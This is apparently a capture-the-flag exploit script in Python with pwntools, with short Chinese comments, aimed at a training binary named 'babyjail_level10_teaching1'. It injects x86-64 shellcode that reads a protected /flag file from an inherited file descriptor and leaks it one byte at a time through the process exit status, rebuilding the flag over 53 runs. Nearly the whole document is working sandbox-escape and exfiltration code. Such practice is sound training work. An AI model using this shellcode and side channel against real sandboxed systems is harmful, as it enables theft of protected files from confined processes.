from pwn import *
import os

# 不知道pwn的写法如何获取sys-signal
# 如果不太行就用os.system()去调用
# 就是很麻烦, 要一个个来很烦, 还得确定偏移

context(os='linux', arch='amd64',)#log_level='debug')

def getshellcode(num):
    shellcode = b""
    shellcode += asm("xor rax, rax")
    shellcode += asm("xor rdi, rdi")
    shellcode += asm("xor rsi, rsi")
    shellcode += asm("xor rdx, rdx")
    shellcode += asm("mov rax, 0")
    shellcode += asm("mov rdi, 3")
    shellcode += asm("lea rsi, [rip+0x20]")
    shellcode += asm("mov rdx, {}".format(100))
    shellcode += asm("syscall")
    shellcode += asm("mov rax, 60")
    shellcode += asm("mov edi, dword ptr [rsi+{}]".format(num))
    shellcode += asm("syscall")
    #shellcode += asm('.string "\a"')
    return shellcode

if __name__ == '__main__':
    stderr = open("/tmp/err", "wb")
    string = ''
    for i in range(53):
        io = process(["./babyjail_level10_teaching1", "/flag"], stderr=stderr)
        io.recvuntil("stdin\n")
        io.sendline(getshellcode(i))
        io.recvall()
        #io.interactive()
        string += chr(io.poll())    # 获取exit code
        io.close()
    print(string)
